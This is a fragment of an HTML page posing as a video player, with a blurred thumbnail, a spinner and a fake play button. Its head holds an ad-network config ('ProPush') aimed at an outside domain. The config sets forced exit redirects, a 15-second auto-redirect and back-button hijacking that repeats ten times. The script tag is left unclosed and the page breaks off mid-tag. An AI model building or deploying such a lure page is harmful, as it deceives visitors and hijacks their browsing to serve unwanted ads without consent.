<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0, user-scalable=no"
  >
  <title>Video Player</title>

  <!-- ProPush CONFIG -->
  <script>
    var APP_CONFIG = {
      domain: "https://jup9.com",

      mainExit_currentTab_zoneId: 10474870,
      mainExit_newTab_zoneId: 10474869,
      reverse_zoneId: 10474868,

      autoexit_zoneId: 10474871,
      autoexit_timeToRedirect: 15,

      back_zoneId: 10474872,
      back_count: 10
    };

  <style>
    body {
      background-color: #000;
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      width: 100vw;
      overflow: hidden;
      color: #fff;
    }

    .video-container {
      position: relative;
      width: 100%;
      max-width: 900px;
      background: #000;
      aspect-ratio: 16/9;
      overflow: hidden;
      cursor: pointer;
    }

    .xh-frame {
      position: absolute;
      inset: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      opacity: 0;
      filter: blur(15px) brightness(0.6);
      transition: filter .5s ease, opacity .8s ease;
    }

    .xh-frame.loaded {
      opacity: 1;
      filter: blur(3px) brightness(.7);
    }

    .xh-loader {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      border: 4px solid rgba(255,255,255,.1);
      border-top: 4px solid #fff;
      border-radius: 50%;
      width: 45px;
      height: 45px;
      animation: spin 1s linear infinite;
      z-index: 30;
    }

    @keyframes spin {
      to {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }

    .central-play {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 70px;
      height: 70px;
      background: rgba(255,255,255,.2);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 20;
    }

    .central-play::after {
      content: "";
      border-style: solid;
      border-width: 15px 0 15px 25px;
      border-color: transparent transparent transparent #fff;
      margin-left: 5px;
    }
  </st
